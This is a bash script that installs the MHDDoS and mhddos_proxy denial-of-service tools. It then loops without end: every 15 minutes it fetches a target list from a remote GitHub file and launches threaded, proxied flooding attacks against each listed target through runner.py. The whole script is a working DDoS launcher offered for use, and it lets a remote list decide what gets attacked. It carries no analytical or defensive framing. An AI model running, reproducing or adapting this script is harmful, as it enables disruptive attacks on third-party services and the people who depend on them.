#!/bin/bash
# Install git, python3, pip, mhddos_proxy, MHDDoS and updated proxy list.
sudo apt update -qq -y
sudo apt install git python3 python3-pip -qq -y
# for some virtual cloud systems based on debian (like GC)
sudo apt install gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo pip install --upgrade pip

cd ~
sudo rm -r mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
python3 -m pip install -r ~/mhddos_proxy/requirements.txt
cd mhddos_proxy
#rm proxies_config.json
#curl -o proxies_config.json https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json 
git clone https://github.com/MHProDev/MHDDoS.git

threads="${1:-500}"
rpc="--rpc 2000"
proxy_upd="-p 3600"
debug="--debug"
logs="~/logs.txt"

# Restart attacks and update targets every 15 minutes
while true
do
   pkill -f start.py; pkill -f runner.py 
   rm -rf $logs
   touch $logs
   # Get number of targets. Sometimes list_size = 0 (network or github problem). So here is check to avoid script error.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
   while [[ $list_size = "0"  ]]
      do
            sleep 5
            list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
      done
      
   threads_per_target=$((threads / list_size))
   threads_per_target="-t $threads_per_target"
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")

            echo ""
            echo "---------"
            echo "Starting attack with params: $cmd_line $threads_per_target $rpc $proxy_upd $debug"
            echo "---------"
            echo ""
            python3 ~/mhddos_proxy/runner.py $cmd_line $threads_per_target $rpc $proxy_upd $debug >> $logs &
      done
sleep 15m
done
